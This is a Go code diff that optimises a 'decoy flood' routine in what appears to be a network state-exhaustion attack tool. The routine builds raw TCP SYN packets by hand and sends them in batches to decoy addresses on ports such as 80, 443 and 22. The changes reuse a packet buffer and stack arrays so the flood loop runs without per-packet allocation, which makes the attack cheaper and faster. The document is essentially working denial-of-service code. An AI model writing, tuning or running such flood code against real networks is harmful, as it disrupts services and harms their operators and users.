@@ -176,6 +176,10 @@ func (s *StateExhaustionStrategy) launchDecoyFlood(ctx context.Context, realTarg
 		return
 	}
 
+	// Reusable 40-byte packet buffer (IP+TCP) — avoids per-packet allocation
+	// across the flood loop. buildSYNPacket fully rewrites it every call.
+	var pktBuf [40]byte
+
 	// Launch decoy flood
 	for batch := 0; batch < 10; batch++ {
 		select {
@@ -202,8 +206,8 @@ func (s *StateExhaustionStrategy) launchDecoyFlood(ctx context.Context, realTarg
 			ports := []int{80, 443, 8080, 8443, 22, 21}
 			dstPort := ports[i%len(ports)]
 
-			// Build SYN packet
-			packet := s.buildSYNPacket(getLocalIP(), decoyIP, uint16(srcPort), uint16(dstPort))
+			// Build SYN packet into the reusable buffer
+			packet := s.buildSYNPacket(pktBuf[:], getLocalIP(), decoyIP, uint16(srcPort), uint16(dstPort))
 
 			// Send
 			addr := &syscall.SockaddrInet4{Port: dstPort}
@@ -218,25 +222,32 @@ func (s *StateExhaustionStrategy) launchDecoyFlood(ctx context.Context, realTarg
 	}
 }
 
-// buildSYNPacket creates a TCP SYN packet
-func (s *StateExhaustionStrategy) buildSYNPacket(srcIP, dstIP net.IP, srcPort, dstPort uint16) []byte {
+// buildSYNPacket creates a TCP SYN packet.
+// buf must be at least 40 bytes; the same buffer can be reused across calls to
+// avoid per-packet heap allocations in the flood loop. The returned slice
+// aliases buf (length 40). Byte layout and checksums are identical to a fresh
+// per-call allocation — these are raw on-wire packets and must stay exact.
+func (s *StateExhaustionStrategy) buildSYNPacket(buf []byte, srcIP, dstIP net.IP, srcPort, dstPort uint16) []byte {
+	packet := buf[:40]
+	ipHeader := packet[0:20]
+	tcpHeader := packet[20:40]
+
 	// IP Header (20 bytes)
-	ipHeader := make([]byte, 20)
 	ipHeader[0] = 0x45     // Version 4, IHL 5
 	ipHeader[1] = 0x00     // DSCP/ECN
 	totalLen := uint16(40) // IP(20) + TCP(20)
 	binary.BigEndian.PutUint16(ipHeader[2:4], totalLen)
 
 	// Random ID
-	randID := make([]byte, 2)
-	rand.Read(randID)
-	copy(ipHeader[4:6], randID)
+	rand.Read(ipHeader[4:6])
 
 	ipHeader[6] = 0x40 // Don't fragment
 	ipHeader[7] = 0x00
 	ipHeader[8] = 64 // TTL
 	ipHeader[9] = 6  // TCP
 
+	ipHeader[10] = 0 // checksum computed below; zero first
+	ipHeader[11] = 0
 	copy(ipHeader[12:16], srcIP.To4())
 	copy(ipHeader[16:20], dstIP.To4())
 
@@ -245,48 +256,53 @@ func (s *StateExhaustionStrategy) buildSYNPacket(srcIP, dstIP net.IP, srcPort, d
 	binary.BigEndian.PutUint16(ipHeader[10:12], ipChecksum)
 
 	// TCP Header (20 bytes)
-	tcpHeader := make([]byte, 20)
 	binary.BigEndian.PutUint16(tcpHeader[0:2], srcPort)
 	binary.BigEndian.PutUint16(tcpHeader[2:4], dstPort)
 
 	// Random sequence number
-	randSeq := make([]byte, 4)
-	rand.Read(randSeq)
-	copy(tcpHeader[4:8], randSeq)
+	rand.Read(tcpHeader[4:8])
 
 	// ACK number = 0
+	tcpHeader[8] = 0
+	tcpHeader[9] = 0
+	tcpHeader[10] = 0
+	tcpHeader[11] = 0
 	tcpHeader[12] = 0x50 // Data offset = 5 (20 bytes)
 	tcpHeader[13] = 0x02 // SYN flag
 
 	// Window size
 	binary.BigEndian.PutUint16(tcpHeader[14:16], 65535)
 
+	// Checksum + urgent pointer zeroed before computing TCP checksum
+	tcpHeader[16] = 0
+	tcpHeader[17] = 0
+	tcpHeader[18] = 0
+	tcpHeader[19] = 0
+
 	// TCP Checksum (with pseudo-header)
 	tcpChecksum := s.calculateTCPChecksum(srcIP, dstIP, tcpHeader)
 	binary.BigEndian.PutUint16(tcpHeader[16:18], tcpChecksum)
 
-	// Combine
-	packet := append(ipHeader, tcpHeader...)
 	return packet
 }
 
+// calculateTCPChecksum computes the TCP checksum over the 12-byte pseudo-header
+// plus the TCP header. It assumes the checksum field (tcpHeader[16:18]) is
+// already zeroed. Uses a fixed stack array to avoid heap allocation.
 func (s *StateExhaustionStrategy) calculateTCPChecksum(srcIP, dstIP net.IP, tcpHeader []byte) uint16 {
-	// Pseudo-header
-	pseudo := make([]byte, 12)
-	copy(pseudo[0:4], srcIP.To4())
-	copy(pseudo[4:8], dstIP.To4())
-	pseudo[8] = 0
-	pseudo[9] = 6 // TCP
-	binary.BigEndian.PutUint16(pseudo[10:12], uint16(len(tcpHeader)))
+	var data [12 + 20]byte
 
-	// Combine for checksum
-	data := append(pseudo, tcpHeader...)
+	// Pseudo-header (12 bytes)
+	copy(data[0:4], srcIP.To4())
+	copy(data[4:8], dstIP.To4())
+	data[8] = 0
+	data[9] = 6 // TCP
+	binary.BigEndian.PutUint16(data[10:12], uint16(len(tcpHeader)))
 
-	// Zero out checksum field
-	data[12+16] = 0
-	data[12+17] = 0
+	// TCP header (checksum field already zeroed by caller)
+	copy(data[12:], tcpHeader)
 
-	return tcpChecksum(data)
+	return tcpChecksum(data[:12+len(tcpHeader)])
 }
 
 func tcpChecksum(data []byte) uint16 {
